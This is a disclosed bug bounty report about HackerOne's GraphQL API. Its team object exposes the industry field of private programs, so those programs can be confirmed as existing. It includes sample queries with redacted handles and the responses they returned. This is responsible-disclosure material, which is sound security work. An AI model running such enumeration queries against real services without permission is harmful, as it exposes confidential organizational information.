# Team object in GraphQL disclosed of private programs via the industry

## Report Details
- **Report ID**: 707406
- **URL**: https://hackerone.com/reports/707406
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-10-04T03:19:58.748Z
- **Disclosed**: 2019-11-23T09:19:24.466Z

## Reporter
- **Username**: haxta4ok00
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**
Disclosure of private programs across the industry


If the program is private, it will show industriy


### Steps To Reproduce
{"query": "query {team(handle:\\"█████████\\"){_id,industry}}"}

`{"data":{"team":{"_id":"█████████","industry":"Computer Hardware \u0026 Peripherals"}}}`

{"query": "query {team(handle:\\"█████████\\"){_id,industry}}"}

`{"data":{"team":{"_id":"████████","industry":"Computer Software"}}}`

{"query": "query {team(handle:\\"███\\"){_id,industry}}"}

`{"data":{"team":{"_id":"████","industry":null}}}`

## Impact

Disclosure of private programs

## Attachments
No attachments
